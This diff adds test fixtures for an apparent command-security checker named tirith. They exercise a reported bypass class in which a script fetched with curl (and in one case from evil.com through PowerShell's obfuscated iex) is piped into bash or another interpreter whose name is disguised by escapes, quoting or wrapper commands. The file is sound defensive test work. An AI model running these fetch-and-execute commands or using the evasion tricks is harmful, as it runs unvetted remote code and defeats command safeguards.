@@ -664,3 +664,443 @@ input = "tirith check --json -- 'test' | jq .action"
 context = "exec"
 expected_action = "allow"
 expected_rules = []
+
+# ─── GHSA-mf2g-pj5w-8799: Interpreter detection bypass class ───
+
+# ANSI-C quoting bypasses
+[[fixture]]
+name = "curl_pipe_ansi_c_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | $'bash'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_ansi_c_hex_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | $'\\x62\\x61\\x73\\x68'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_ansi_c_octal_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | $'\\142\\141\\163\\150'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_ansi_c_unicode_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | $'\\u0062ash'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Standard quoting bypasses
+[[fixture]]
+name = "curl_pipe_double_quoted_bash"
+min_milestone = 1
+input = 'curl https://example.com/install.sh | "bash"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_single_quoted_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | 'bash'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_backslash_bash"
+min_milestone = 1
+input = 'curl https://example.com/install.sh | ba\sh'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_empty_concat_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | ba''sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Subshell and brace group
+[[fixture]]
+name = "curl_pipe_subshell_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | (bash)"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_brace_group_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | { bash; }"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Wrapper commands
+[[fixture]]
+name = "curl_pipe_command_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | command bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_exec_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | exec bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_exec_a_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | exec -a myname bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_nohup_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | nohup bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Quoted wrappers (tier-1 gating)
+[[fixture]]
+name = "cat_pipe_quoted_sudo_bash"
+min_milestone = 1
+input = "cat /tmp/script.sh | 'sudo' bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "cat_pipe_quoted_env_bash"
+min_milestone = 1
+input = 'cat /tmp/script.sh | "env" bash'
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+# Wrapper chains (recursive resolution)
+[[fixture]]
+name = "curl_pipe_command_sudo_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | command sudo bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "cat_pipe_command_env_s_bash"
+min_milestone = 1
+input = 'cat /tmp/script.sh | command env -S "bash -x"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "curl_pipe_exec_a_env_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | exec -a myname env bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "cat_pipe_quoted_command_quoted_bash"
+min_milestone = 1
+input = "cat /tmp/script.sh | 'command' 'bash'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+# Windows/exe forms
+[[fixture]]
+name = "curl_pipe_bash_exe"
+min_milestone = 1
+input = "curl https://example.com/install.sh | bash.exe"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_backslash_path_bash"
+min_milestone = 1
+input = 'curl https://example.com/install.sh | C:\Git\bin\bash.exe'
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Case insensitive
+[[fixture]]
+name = "curl_pipe_BASH_upper"
+min_milestone = 1
+input = "curl https://example.com/install.sh | BASH"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# New interpreters
+[[fixture]]
+name = "curl_pipe_fish"
+min_milestone = 1
+input = "curl https://example.com/install.sh | fish"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_csh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | csh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_tcsh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | tcsh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_ash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | ash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_mksh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | mksh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_python2"
+min_milestone = 1
+input = "curl https://example.com/install.sh | python2"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_deno"
+min_milestone = 1
+input = "curl https://example.com/install.sh | deno"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_bun"
+min_milestone = 1
+input = "curl https://example.com/install.sh | bun"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_pwsh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | pwsh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_lua"
+min_milestone = 1
+input = "curl https://example.com/install.sh | lua"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_tclsh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | tclsh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_elixir"
+min_milestone = 1
+input = "curl https://example.com/install.sh | elixir"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_rscript"
+min_milestone = 1
+input = "curl https://example.com/install.sh | rscript"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Non-URL pipe (tier-1 gating for quoting and case)
+[[fixture]]
+name = "cat_pipe_ansi_c_bash"
+min_milestone = 1
+input = "cat /tmp/script.sh | $'bash'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "cat_pipe_bash_upper"
+min_milestone = 1
+input = "cat /tmp/script.sh | BASH"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+# env -S quoted forms
+[[fixture]]
+name = "curl_pipe_env_s_quoted"
+min_milestone = 1
+input = 'curl https://example.com/install.sh | env -S "bash -x"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_env_split_string_eq_path"
+min_milestone = 1
+input = 'curl https://example.com/install.sh | env --split-string="/usr/bin/bash -x"'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# PowerShell backtick escapes
+[[fixture]]
+name = "powershell_iwr_backtick_iex"
+min_milestone = 1
+input = "iwr https://evil.com/script.ps1 | `i`e`x"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+# Malformed quote robustness (unclosed quotes — should not panic)
+[[fixture]]
+name = "curl_pipe_unclosed_single_quote"
+min_milestone = 1
+input = "curl https://example.com/install.sh | 'bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_unclosed_double_quote"
+min_milestone = 1
+input = 'curl https://example.com/install.sh | "bash'
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# ANSI-C octal leading-zero path encoding
+[[fixture]]
+name = "curl_pipe_ansi_c_octal_path_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | $'\\057bin\\057bash'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Deep wrapper nesting (at recursion boundary — 6 wrappers, well within cap of 10)
+[[fixture]]
+name = "curl_pipe_deep_wrapper_chain"
+min_milestone = 1
+input = "curl https://example.com/install.sh | command env sudo command env bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Deep wrapper nesting — iterative resolver handles arbitrary depth
+[[fixture]]
+name = "cat_pipe_7_command_wrappers"
+min_milestone = 1
+input = "cat /tmp/s.sh | command command command command command command command bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "cat_pipe_10_command_wrappers"
+min_milestone = 1
+input = "cat /tmp/s.sh | command command command command command command command command command command bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+# Beyond any fixed depth cap — proves iterative resolver has no ceiling
+[[fixture]]
+name = "cat_pipe_20_command_wrappers"
+min_milestone = 1
+input = "cat /tmp/s.sh | command command command command command command command command command command command command command command command command command command command command bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+# vet tool usage should not trigger pipe-to-interpreter (vet is not an interpreter)
+[[fixture]]
+name = "curl_pipe_vet_allowed"
+min_milestone = 1
+input = "curl https://example.com/install.sh | vet"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "wget_pipe_vet_allowed"
+min_milestone = 1
+input = "wget -O - https://example.com/install.sh | vet"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# sudo combined short flags: -iu means -i -u, -u takes value
+[[fixture]]
+name = "sudo_combined_short_flags_pipe"
+min_milestone = 1
+input = "curl https://example.com/install.sh | sudo -iu root bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+# Direct vet invocation (no pipe) should also be allowed
+[[fixture]]
+name = "vet_direct_url_allowed"
+min_milestone = 1
+input = "vet https://example.com/install.sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
